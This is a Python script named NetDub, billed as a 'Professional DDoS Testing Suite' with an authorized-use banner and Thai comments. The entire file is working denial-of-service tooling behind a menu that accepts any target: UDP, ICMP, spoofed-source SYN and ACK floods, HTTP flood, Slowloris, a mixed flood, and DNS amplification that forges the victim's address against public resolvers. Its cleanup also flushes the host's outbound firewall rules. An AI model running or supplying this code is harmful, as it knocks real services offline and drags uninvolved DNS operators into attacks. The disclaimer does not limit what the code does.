#!/usr/bin/env python3
"""
NetDub - Professional DDoS Testing Suite
⚠️ For authorized penetration testing and security research only ⚠️
Requires: Linux root privileges for raw socket operations
"""

import os
import sys
import socket
import struct
import random
import time
import threading
import multiprocessing
from scapy.all import *
from colorama import Fore, Style, init
import subprocess
import ctypes
import signal

# Initialize colorama
init(autoreset=True)

class NetDubCore:
    def __init__(self):
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'connections': 0,
            'pps': 0,
            'start_time': 0
        }
        self.check_root()
        self.setup_signal_handlers()
    
    def check_root(self):
        """ตรวจสอบสิทธิ์ root"""
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] ต้องรันด้วยสิทธิ์ root เท่านั้น")
            print(f"{Fore.YELLOW}[*] ใช้คำสั่ง: sudo python3 {sys.argv[0]}")
            sys.exit(1)
    
    def setup_signal_handlers(self):
        """ตั้งค่า signal handlers"""
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """จัดการ signal"""
        print(f"\n{Fore.RED}[!] หยุดการทดสอบ...")
        self.running = False
        self.cleanup()
        sys.exit(0)
    
    def cleanup(self):
        """ทำความสะอาดทรัพยากร"""
        os.system("iptables -F OUTPUT 2>/dev/null")
        os.system("sysctl -w net.ipv4.ip_local_port_range='32768 60999' 2>/dev/null")

class Layer3Attacks(NetDubCore):
    """Layer 3 (Network Layer) Attacks"""
    
    def udp_flood(self, target_ip, target_port, duration, threads=100):
        """UDP Flood Attack - ส่ง UDP packets มากมาย"""
        print(f"{Fore.CYAN}[*] UDP Flood → {target_ip}:{target_port}")
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            
            while self.running:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    self.stats['packets_sent'] += 1
                except:
                    pass
            sock.close()
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for _ in range(threads):
            threading.Thread(target=udp_worker, daemon=True).start()
        
        time.sleep(duration)
        self.running = False
    
    def icmp_flood(self, target_ip, duration, threads=50):
        """ICMP Flood Attack - ส่ง ICMP packets"""
        print(f"{Fore.CYAN}[*] ICMP Flood → {target_ip}")
        
        def icmp_worker():
            while self.running:
                try:
                    packet = IP(dst=target_ip)/ICMP()/Raw(load=random._urandom(1024))
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                except:
                    pass
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for _ in range(threads):
            threading.Thread(target=icmp_worker, daemon=True).start()
        
        time.sleep(duration)
        self.running = False

class Layer4Attacks(NetDubCore):
    """Layer 4 (Transport Layer) Attacks"""
    
    def syn_flood(self, target_ip, target_port, duration, threads=200):
        """SYN Flood Attack - ส่ง SYN packets ปลอม"""
        print(f"{Fore.CYAN}[*] SYN Flood → {target_ip}:{target_port}")
        
        def syn_worker():
            while self.running:
                try:
                    # สร้าง IP ปลอม
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    
                    # สร้าง SYN packet
                    packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                except:
                    pass
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for _ in range(threads):
            threading.Thread(target=syn_worker, daemon=True).start()
        
        time.sleep(duration)
        self.running = False
    
    def ack_flood(self, target_ip, target_port, duration, threads=150):
        """ACK Flood Attack"""
        print(f"{Fore.CYAN}[*] ACK Flood → {target_ip}:{target_port}")
        
        def ack_worker():
            while self.running:
                try:
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    
                    packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="A")
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                except:
                    pass
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for _ in range(threads):
            threading.Thread(target=ack_worker, daemon=True).start()
        
        time.sleep(duration)
        self.running = False

class Layer7Attacks(NetDubCore):
    """Layer 7 (Application Layer) Attacks"""
    
    def http_flood(self, target_host, target_port, duration, threads=500):
        """HTTP Flood Attack - ส่ง HTTP requests มากมาย"""
        print(f"{Fore.CYAN}[*] HTTP Flood → {target_host}:{target_port}")
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
        ]
        
        def http_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((target_host, target_port))
                    
                    request = f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                    request += f"Host: {target_host}\r\n"
                    request += f"User-Agent: {random.choice(user_agents)}\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    sock.send(request.encode())
                    sock.close()
                    self.stats['packets_sent'] += 1
                except:
                    pass
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for _ in range(threads):
            threading.Thread(target=http_worker, daemon=True).start()
        
        time.sleep(duration)
        self.running = False
    
    def slowloris_advanced(self, target_host, target_port, duration, connections=1000):
        """Advanced Slowloris Attack"""
        print(f"{Fore.CYAN}[*] Slowloris Advanced → {target_host}:{target_port}")
        
        sockets = []
        
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_host, target_port))
                
                sock.send(f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_host}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0 (compatible; NetDub)\r\n".encode())
                sock.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                
                return sock
            except:
                return None
        
        # สร้าง initial connections
        for _ in range(connections):
            sock = create_socket()
            if sock:
                sockets.append(sock)
        
        print(f"{Fore.GREEN}[✓] Created {len(sockets)} connections")
        
        self.running = True
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            # ส่ง keep-alive headers
            for sock in sockets[:]:
                try:
                    sock.send(f"X-{random.randint(1, 999)}: {random.randint(1, 999)}\r\n".encode())
                except:
                    sockets.remove(sock)
            
            # เติม connections ใหม่
            while len(sockets) < connections:
                sock = create_socket()
                if sock:
                    sockets.append(sock)
            
            time.sleep(10)
        
        # ปิด connections
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

class AdvancedAttacks(NetDubCore):
    """Advanced Multi-Layer Attacks"""
    
    def dns_amplification(self, target_ip, duration, threads=100):
        """DNS Amplification Attack"""
        print(f"{Fore.CYAN}[*] DNS Amplification → {target_ip}")
        
        dns_servers = [
            "8.8.8.8", "1.1.1.1", "208.67.222.222", "64.6.64.6",
            "77.88.8.8", "114.114.114.114", "223.5.5.5", "180.76.76.76"
        ]
        
        def dns_worker():
            while self.running:
                try:
                    dns_server = random.choice(dns_servers)
                    # ส่ง DNS query ขนาดใหญ่ด้วย source IP ปลอม
                    packet = IP(src=target_ip, dst=dns_server)/UDP(sport=53, dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                except:
                    pass
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        for _ in range(threads):
            threading.Thread(target=dns_worker, daemon=True).start()
        
        time.sleep(duration)
        self.running = False
    
    def mixed_flood(self, target_ip, target_port, duration):
        """Mixed Protocol Flood - รวมทุกประเภท"""
        print(f"{Fore.CYAN}[*] Mixed Protocol Flood → {target_ip}:{target_port}")
        
        attacks = [
            lambda: self.syn_flood(target_ip, target_port, duration, 100),
            lambda: self.udp_flood(target_ip, target_port, duration, 100),
            lambda: self.icmp_flood(target_ip, duration, 50),
            lambda: self.ack_flood(target_ip, target_port, duration, 75)
        ]
        
        # รัน attacks พร้อมกัน
        for attack in attacks:
            threading.Thread(target=attack, daemon=True).start()
        
        time.sleep(duration)

class NetDubInterface:
    """Main Interface"""
    
    def __init__(self):
        self.layer3 = Layer3Attacks()
        self.layer4 = Layer4Attacks()
        self.layer7 = Layer7Attacks()
        self.advanced = AdvancedAttacks()
        
    def print_banner(self):
        """แสดง banner"""
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                          NetDub                              ║")
        print(f"{Fore.RED}║                Professional DDoS Testing Suite              ║")
        print(f"{Fore.RED}║                                                              ║")
        print(f"{Fore.RED}║              ⚠️ For Authorized Testing Only ⚠️               ║")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════╝")
        print(f"{Fore.YELLOW}[*] Running with ROOT privileges")
        print(f"{Fore.YELLOW}[*] Maximum performance mode enabled")
        print()
    
    def show_menu(self):
        """แสดงเมนู"""
        print(f"{Fore.CYAN}╔════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║              Attack Types              ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  Layer 3 (Network Layer)               ║")
        print(f"{Fore.CYAN}║  [1] UDP Flood                         ║")
        print(f"{Fore.CYAN}║  [2] ICMP Flood                        ║")
        print(f"{Fore.CYAN}║                                        ║")
        print(f"{Fore.CYAN}║  Layer 4 (Transport Layer)            ║")
        print(f"{Fore.CYAN}║  [3] SYN Flood                         ║")
        print(f"{Fore.CYAN}║  [4] ACK Flood                         ║")
        print(f"{Fore.CYAN}║                                        ║")
        print(f"{Fore.CYAN}║  Layer 7 (Application Layer)          ║")
        print(f"{Fore.CYAN}║  [5] HTTP Flood                        ║")
        print(f"{Fore.CYAN}║  [6] Slowloris Advanced                ║")
        print(f"{Fore.CYAN}║                                        ║")
        print(f"{Fore.CYAN}║  Advanced Attacks                      ║")
        print(f"{Fore.CYAN}║  [7] DNS Amplification                 ║")
        print(f"{Fore.CYAN}║  [8] Mixed Protocol Flood              ║")
        print(f"{Fore.CYAN}║                                        ║")
        print(f"{Fore.CYAN}║  [9] Exit                              ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════╝")
        print()
    
    def get_target_info(self):
        """รับข้อมูลเป้าหมาย"""
        target = input(f"{Fore.GREEN}🌐 Target (IP/Domain): {Fore.RESET}").strip()
        port = int(input(f"{Fore.GREEN}🔌 Port: {Fore.RESET}").strip())
        duration = int(input(f"{Fore.GREEN}⏱️ Duration (seconds): {Fore.RESET}").strip())
        return target, port, duration
    
    def stats_monitor(self, attack_obj):
        """แสดงสถิติการทำงาน"""
        while attack_obj.running:
            elapsed = time.time() - attack_obj.stats['start_time']
            pps = attack_obj.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{Fore.YELLOW}[📊] PPS: {pps:.0f} | Packets: {attack_obj.stats['packets_sent']} | Time: {elapsed:.1f}s", end="")
            time.sleep(1)
        print()
    
    def run(self):
        """เริ่มโปรแกรม"""
        self.print_banner()
        
        while True:
            self.show_menu()
            choice = input(f"{Fore.GREEN}Select attack type: {Fore.RESET}").strip()
            
            if choice == "1":
                target, port, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.layer3,), daemon=True)
                monitor.start()
                self.layer3.udp_flood(target, port, duration)
                
            elif choice == "2":
                target, _, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.layer3,), daemon=True)
                monitor.start()
                self.layer3.icmp_flood(target, duration)
                
            elif choice == "3":
                target, port, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.layer4,), daemon=True)
                monitor.start()
                self.layer4.syn_flood(target, port, duration)
                
            elif choice == "4":
                target, port, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.layer4,), daemon=True)
                monitor.start()
                self.layer4.ack_flood(target, port, duration)
                
            elif choice == "5":
                target, port, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.layer7,), daemon=True)
                monitor.start()
                self.layer7.http_flood(target, port, duration)
                
            elif choice == "6":
                target, port, duration = self.get_target_info()
                self.layer7.slowloris_advanced(target, port, duration)
                
            elif choice == "7":
                target, _, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.advanced,), daemon=True)
                monitor.start()
                self.advanced.dns_amplification(target, duration)
                
            elif choice == "8":
                target, port, duration = self.get_target_info()
                monitor = threading.Thread(target=self.stats_monitor, args=(self.advanced,), daemon=True)
                monitor.start()
                self.advanced.mixed_flood(target, port, duration)
                
            elif choice == "9":
                print(f"{Fore.RED}[!] Exiting NetDub...")
                break
            
            else:
                print(f"{Fore.RED}[!] Invalid choice")
            
            print(f"{Fore.GREEN}[✓] Attack completed\n")

if __name__ == "__main__":
    try:
        netdub = NetDubInterface()
        netdub.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program interrupted by user")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")
